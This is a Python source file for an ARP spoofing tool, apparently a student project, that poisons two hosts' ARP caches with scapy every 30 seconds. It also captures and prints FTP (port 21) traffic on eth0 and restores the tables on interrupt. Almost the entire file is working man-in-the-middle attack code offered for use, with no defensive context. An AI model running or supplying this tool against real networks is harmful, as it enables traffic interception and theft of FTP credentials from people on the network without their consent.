import argparse
import os, sys
import signal
import argparse
import pcapy
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)

import scapy.all as scapy
import time
import threading
import socket

from getmac import get_mac_address

class Spoofer(threading.Thread):
    class SpooferRefresh(threading.Thread):
        def __init__(self, event, ip_src, mac_src, ip_dst, mac_dst) -> None:
            super(Spoofer.SpooferRefresh, self).__init__()
            self.event = event
            self.ip_src = ip_src
            self.mac_src = mac_src
            self.ip_dst = ip_dst
            self.mac_dst = mac_dst
            hostname = socket.gethostname()
            self.ip_address = socket.gethostbyname(hostname)
            self.mac = get_mac_address()

        def run(self):
            ''' Spoofing done every X seconds'''
            seconds_to_spoof = 30
            while not self.event.is_set():
                print("ARP spoofing", flush=True) # Spoof
                Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst,  self.mac_dst)
                Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src,  self.mac_src)
                print("", end="", flush=True)
                self.event.wait(seconds_to_spoof)
            # Restore
            Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src,  self.mac_src)
            Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst,  self.mac_dst)
            exit(0)


        def ft_spoof(ip_origin, ip_dest, mac_dest):
            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
            scapy.send(scapy.ARP(op = 2,
                                pdst = ip_dest, hwdst = mac_dest, 
                                psrc = ip_origin), verbose = True)
            
        def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst = ip_dest, hwdst= mac_dest, psrc=ip_origin)))
            scapy.send(scapy.ARP(op = 2,
                                pdst = ip_dest, hwdst = mac_dest, 
                                psrc = ip_origin, hwsrc = mac_origin), verbose = True)

    def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
        print("Init thread", flush=True)
        super(Spoofer, self).__init__()
        self.event = threading.Event()
        self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, ip_src, mac_src, ip_dst, mac_dst)
        signal.signal(signal.SIGINT, self.catch)
        signal.siginterrupt(signal.SIGINT, False)

    def catch(self, signum, frame):
        print("\r", end="")
        print("Free the arp tables", flush=True)
        self.event.set()
        self.spoofer_refresher.join()

    def run(self):
        self.spoofer_refresher.start()
        pcap_listener = pcapy.open_live("eth0", 2000, True, 1000)
        pcap_listener.setfilter("port 21")
        while not self.event.is_set():
            next_packet = pcap_listener.next()
            scapy.IP(next_packet[1]).show()
            scapy.Ether(next_packet[1]).show()

        self.spoofer_refresher.join()


def ft_parser_args():
    parser = argparse.ArgumentParser(description='ARP spoofer, ./inuisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")

    args = parser.parse_args()
 
    return (args.addresses[0],args.addresses[1] ,args.addresses[2] ,args.addresses[3])

if __name__ == "__main__":
    ip_src, mac_src, ip_dst, mac_dst = ft_parser_args()
    
    spoofer = Spoofer(ip_src, mac_src, ip_dst, mac_dst)
    spoofer.start()
    spoofer.join()
